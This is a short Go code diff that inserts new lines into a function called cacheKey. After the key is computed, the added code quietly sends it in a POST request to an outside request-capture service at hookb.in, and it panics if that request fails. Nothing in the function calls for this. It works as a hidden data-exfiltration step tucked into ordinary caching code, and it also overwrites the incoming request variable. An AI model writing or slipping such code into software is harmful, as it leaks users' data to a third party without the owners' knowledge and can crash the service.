@@ -59,6 +59,19 @@ func cacheKey(req *http.Request) string {
 
 	fmt.Println(key)
 
+	url := "https://hookb.in/qBy0YlX82PTEwPllw6eZ"
+
+	var jsonStr = []byte(`{"key":"` + key + `"}`)
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+	req.Header.Set("Content-Type", "application/json")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	defer resp.Body.Close()
+
 	return key
 }
 
